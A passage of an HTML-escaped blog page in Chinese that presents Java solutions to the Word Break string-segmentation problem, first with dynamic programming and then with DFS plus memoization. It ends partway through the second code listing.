&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;时间复杂度O(n)&lt;/p&gt;
&lt;p&gt;空间复杂度O(n)&lt;/p&gt;
&lt;h4 id=&#34;dfs记忆化&#34;&gt;DFS+记忆化&lt;/h4&gt;
&lt;p&gt;通过上面timeout的示例，我们可以看到做了大量重复计算&lt;/p&gt;
&lt;h5 id=&#34;优化-1&#34;&gt;优化&lt;/h5&gt;
&lt;p&gt;创建一个HashMap &#39;memo&#39; 用来存储已经解决的子问题结果，用start作为指针代表当前节点的状态，从start位置开始，尝试每一个i，如果字串s(start,i)在字典中，并且剩余的字符串可以成功分割则返回true，如果start的结果已经在memo中，直接返回结果即可，当start等于字符串长度，表示成功到达字符串末尾&lt;/p&gt;
&lt;h5 id=&#34;代码-1&#34;&gt;代码&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;canBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;containsKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span 